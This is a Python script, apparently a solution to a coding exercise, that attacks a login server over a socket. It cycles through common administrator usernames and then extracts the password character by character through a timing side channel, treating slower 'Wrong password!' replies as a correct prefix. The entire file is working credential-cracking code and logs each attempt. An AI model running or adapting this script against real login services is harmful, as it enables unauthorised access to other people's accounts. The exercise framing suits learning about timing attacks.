# write your code here
import sys
import socket
import json
from datetime import datetime


def request_response(my_socket, login, passw):
    log_file = open('log.txt', 'a')
    my_message = '{"login": "' + login + '", "password": "' + passw + '"}'
    start = datetime.now()
    my_socket.send(my_message.encode())
    my_response = my_socket.recv(1024)
    finish = datetime.now()
    response_str = my_response.decode()
    difference = finish - start
    diff = int(str(difference).split('.')[1])
    response_obj = json.loads(response_str)
    if response_obj['result'] == 'Wrong login!':
        log_file.write('Diff: ' + str(diff) + ' Wrong login:' + login + '\n')
        log_file.close()
        return 0
    elif response_obj['result'] == 'Wrong password!' and diff < 90000:
        log_file.write('Diff: ' + str(diff) + ' Login: ' + login + ' wrong password:' + passw + '\n')
        log_file.close()
        return 1
    elif response_obj['result'] == 'Wrong password!' and diff > 90000:
        log_file.write('Diff: ' + str(diff) + ' Exception with login' + login + ' password:' + passw + '\n')
        log_file.close()
        return 2
    elif response_obj['result'] == 'Connection success!':
        log_file.write('login successfully')
        log_file.close()
        return 3
    else:
        log_file.write('Raw response: ' + str(response_obj) + '\n')
        log_file.close()
        return -1


logins_dict = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user',
               'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser',
               'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']
chars_dict = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
              'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
              'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
my_ip_address = sys.argv[1]
my_port = int(sys.argv[2])
pass_lst = []
work_flag = True
with socket.socket() as net_socket:
    net_socket.connect((my_ip_address, my_port))
    correct_login = ''
    correct_pass = ''
    for temp_login in logins_dict:
        temp_pass = ' '
        if request_response(net_socket, temp_login, temp_pass) == 1:
            correct_login = temp_login
            break
    while work_flag:
        for temp_char in chars_dict:
            result_request = request_response(net_socket, correct_login, correct_pass + temp_char)
            if result_request == 2:
                correct_pass += temp_char
                break
            elif result_request == 3:
                correct_pass += temp_char
                work_flag = False
                break
    print('{"login": "' + correct_login + '", "password": "' + correct_pass + '"}')
